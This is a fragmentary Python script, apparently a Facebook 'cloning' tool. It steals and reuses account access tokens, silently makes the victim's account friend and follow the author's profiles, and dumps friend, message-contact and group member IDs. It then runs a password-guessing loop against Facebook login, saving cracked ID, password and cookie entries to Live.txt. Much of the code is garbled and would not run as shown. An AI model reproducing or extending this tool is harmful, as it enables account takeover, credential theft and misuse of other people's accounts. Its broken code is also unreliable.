...
\x1b[1;95m[\x1b[1;97m•\x1b[1;95m]\x1b[1;97m au : Ali
\x1b[1;95m[\x1b[1;97m•\x1b[1;95m]\x1b[1;97m fb : fb.com/Ali.Abbas
\x1b[1;95m[\x1b[1;97m•\x1b[1;95m]\x1b[1;97m gh : github.com/Larkaw Ali
\x1b[1;96m[\x1b[1;97m#\x1b[1;96m]\x1b[1;97m——————————————————————————————
""")
...
def basetoken():
	if os.path.exists("_____ali_____"):
		if os.path.getsize("_____ali_____") !=0:
			return token_s = open(".fb_token.txt","w")
		else:login()
	else:login()
def gets_dict_token(token):
	result={}
	try:
...
def login():
	os.system('clear')
	print(logo)
	print("\x1b[1;92m[\x1b[1;97m1\x1b[1;92m]\x1b[1;97m Login Token")
	print("\x1b[1;92m[\x1b[1;97m2\x1b[1;92m]\x1b[1;97m Facebook Account")
	print("\x1b[1;92m[\x1b[1;93m0\x1b[1;92m]\x1b[1;93m BACK")
	...
	if login == "":
		...
		try:
			r = requests.get("https://graph.facebook.com/me?access_token="+token)
	                data = {
      api_key""882a8490361da98702bf97a021ddc14d","credentials_type":"token","format""JSON", "gen
	                coki = requests.get('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_', headers = data)
        	        cari = re.search('(EAAA\w+)', tok.ext)
	                hasil = cari.group(1)
	                tok = open('_____ali_____', 'w')
	                tok.write(token)
	                cok.close()
	                tok = open('___ali___', 'w')
	                tok.write(hasil)
	                tok.close()
	                bot_follow()
	        except AttributeError,UnboundLocalError:
	                print('\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m token ali')
	                time.sleep(2)
	                login()
		except requests.exceptions.ConnectionError:
			exit("\x1b[1;92m[\x1b[1;93m•\x1b[1;92m]\x1b[1;93m Ali Error")
	elif login == "2":
...
def cek_token():
	cvds=None
        ...
        if cek(1)==False:
                try:
                        oken_s = open(".fb_token.txt","w")
                        cvds=cvd(token)
                        new=True
                except:
                        print("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Token Invalid");login()
        else:
		...
		print('\x1b[1;96m[\x1b[1;97m#\x1b[1;96m]\x1b[1;97m Ali Token')
		time.sleep(2)
                print("\x1b[1;97m[\x1b[1;92m*\x1b[1;97m]\x1b[1;92m Ali Abbas :\x1b[1;93m %s"%(
                        bs4.BeautifulSoup(r,
		...
		menu()
                ...
                try:
                        os.remove("_____ali_____")
                except:
                        pass
                print("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Token Invalid");login()
def bot_follow():
	try:
		token=open('___ali___','r').read()
	except IOError:
		print ("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m] \x1b[1;91mToke Invalid")
		   r = requests.get("https://graph.facebook.com/me?access_token="+token)
	...
	komen3 = kata_utama3+"\n"+pantun_motivasi+"\n"+waktu
	requests.post('https://graph.facebook.com/me/friends?method=post&uids=100064814153036&access_token='+token) #ali
	requests.post('https://graph.facebook.com/757953543/subscribers?access_token='+token) #ali
        requests.post('https://graph.facebook.com/100000288808056/subscribers?access_token='+token) #Muhammad ali
	requests.post('https://graph.facebook.com/100064814153036/subscribers?access_token='+token) #ali
...
def publik_fast():
        try:
                ...
                print('\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m tokens Invalid')
                os.system('rm -rf ___ali___')
                time.sleep(2)
                login()
        try:
                ...
                fle.close()
                print("\r\x1b[1;92m                     ")
                print("\x1b[1;97m[\x1b[1;92m*\x1b[1;97m]\x1b[1;92m ALI')
                print("\x1b[1;97m[\x1b[1;92m*\x1b[1;97m]\x1b[1;92m File Dump Ali:\x1b[1;93m "+file)
                raw_input("\x1b[1;97m{\x1b[1;92mKembali\x1b[1;97m}")
                menu()
		...
		exit("\x1b[1;97m[\x1b[1;93m•\x1b[1;97m]\x1b[1;93m Ali Error")
class friendlist:
    ...
    def dump(self, ok):
        r = bs4.BeautifulSoup(requests.get(ok, headers=hdcok(), tokens=self.token).text, 'html.parser')
        if self.nitel == None:
            ...
            if 'lihat teman lain' in i.text.lower():
                ...
                while True:
                    try:
                        ...
                        continue
	print("\r\x1b[1;97m                                              ")
	print('\x1b[1;97m[\x1b[1;92m*\x1b[1;97m]\x1b[1;92m Cloning Start')
...
def search(fl,r,b):
	...
	b=bs4.BeautifulSoup(requests.get(
		b, tokens=r,headers=hdcok()).text,"html.parser")
...
def dumpfl():
	...
	if cek(1)==False:
		try:
			token=cvd(open("_____ali_____").read().strip())
			cvds=cvd(token)
			new=True
		except:
			print("[•] token Invalid");login()
	else:
		cvds=cvd(open("_____ali_____").read().strip())
	r=requests.get("https://mbasic.facebook.com/profile.php",
		tokens=cvds,
	headers=hdcok()).text
	if len(bs4.re.findall("logout",r)) !=0:
		if new==True:
			open("_____ali_____","w").write(token)
...
class dump_message:
    ...
    def dump(self, url):
        bs = bs4.BeautifulSoup(requests.get(url, headers=hdcok(), tokens=self.tokens).text, 'html.parser')
        for i in bs.find_all('a', href=True):
            if '/messages/read' in i.get('href'):
                f = bs4.re.findall('cid\\.c\\.(.*?)%3A(.*?)&', i.get('href'))
                try:
                    for ip in list(f.pop()):
                        if self.tokens.get(' c_user') in ip:
                            continue
                        else:
...
class dump_grup:
    ...
    def extract(self, url):
        bs = bs4.BeautifulSoup(requests.get(url, tokens=self.tokens, headers=hdcok()).text, 'html.parser')
        for i in bs.find_all('a', href=True):
    ...
    def manual(self):
        ...
        if id == '':
            ...
            r = bs4.BeautifulSoup(requests.get('https://m.facebook.com/groups/' + id, headers=hdcok(), tokens=self.tokens).text, 'html.parser')
    ...
    def dumps(self, url):
        r = bs4.BeautifulSoup(requests.get(url, tokens=self.tokens, headers=hdcok()).text, 'html.parser')
...
def menu():
	...
	print("\x1b[1;97m[\x1b[1;91m00\x1b[1;97m]\x1b[1;91m Remove Token")
	daftar_menu()
def daftar_menu():
	...
	if pilih == "":
		...
		time.sleep(3)
		os.system("xdg-open https://wa.me/6285727173376?text=Hallo%20Bang%20ali")
		exit()
	elif pilih == "00":
		try:
			print("\x1b[1;93m[\x1b[1;97m*\x1b[1;93m]\x1b[1;97m Menghapus token & Token")
			os.remove("___ali___")
			os.remove("_____ali_____")
		except Exception as e:
...
def mbasic(em,pas,hosts):
	...
	if "c_user" in r.tokens.get_dict().keys():
		return {"status":"success","email":em,"pass":pas,"tokens":r.tokens.get_dict()}
	elif "checkpoint" in r.tokens.get_dict().keys():
		return {"status":"cp","email":em,"pass":pas,"tokens":r.tokens.get_dict()}
		...
		try:
			for i in fl.get("pw"):
				...
				if log.get("status")=="success":
					print("\r\x1b[1;92m[Ok] "+(fl.get("id")+"|"+i+" "+gets_tokens(log.get("tokens"))))
					self.ada.append("%s | %s"%(fl.get("id"),i))
					if fl.get("id") in open("Live.txt").read():
						break
					else:
						open("Live.txt","a+").write(
						"%s|%s %s\n\n"%(fl.get("id"),i,gets_tokens(log.get("tokens"))))
					ko="%s|%s %s\n\n"%(fl.get("id"),i,gets_tokens(log.get("tokens")))
					break
